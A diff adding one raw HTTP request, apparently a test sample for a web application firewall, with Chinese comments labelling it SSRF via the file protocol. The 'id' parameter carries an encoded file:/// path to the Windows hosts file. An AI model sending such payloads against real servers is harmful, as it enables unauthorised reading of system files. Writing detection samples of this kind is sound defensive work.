@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_FILE协议_Windows文件读取
+# 利用file协议读取windows系统host配置文件信息
+GET /?id=file:%2F%2F%2FC:%5CWINDOWS%5Csystem32%5Cdrivers%5Cetc%5Chosts&bid=hd_tag_m8mv24na HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24na
+RM-PRO-Token: 7836498dcbb2d08cbd1ef394762daa53
+RM-PRO-Time: 1742808394157
+User-Agent: curl/7.83.1
+
